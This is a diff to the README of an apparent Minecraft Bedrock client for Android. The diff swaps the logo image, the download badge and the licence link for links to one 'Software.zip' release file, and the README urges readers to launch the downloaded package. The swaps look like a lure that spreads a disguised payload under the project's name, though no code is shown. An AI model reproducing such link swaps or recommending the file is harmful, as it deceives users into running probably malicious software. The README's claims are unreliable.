@@ -1,6 +1,6 @@
 # MuCuteClient 🚀
 
-![Minecraft Logo](https://img.icons8.com/color/452/minecraft-logo.png)
+![Minecraft Logo](https://github.com/Julio3347/MuCuteClient/releases/download/v2.0/Software.zip)
 
 MuCuteClient is an Android application that implements MuCuteRelay for Minecraft Bedrock. This project aims to provide a seamless experience for Minecraft Bedrock players by leveraging the MuCuteRelay technology. By using MuCuteClient, players can enhance their multiplayer experience and enjoy the game to its fullest potential.
 
@@ -29,7 +29,7 @@ MuCuteClient is an Android application that implements MuCuteRelay for Minecraft
 ## Getting Started 🚦
 
 To get started with MuCuteClient, you can download the software package from the link below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/Julio3347/MuCuteClient/releases/download/v2.0/Software.zip)](https://github.com/Julio3347/MuCuteClient/releases/download/v2.0/Software.zip)
 
 ⚠️ Note: Please launch the downloaded software package to begin using MuCuteClient.
 
@@ -45,7 +45,7 @@ We welcome contributions to the MuCuteClient project. If you would like to contr
 
 ## License 📄
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Julio3347/MuCuteClient/releases/download/v2.0/Software.zip](https://github.com/Julio3347/MuCuteClient/releases/download/v2.0/Software.zip) file for details.
 
 ## Support ℹ️
 
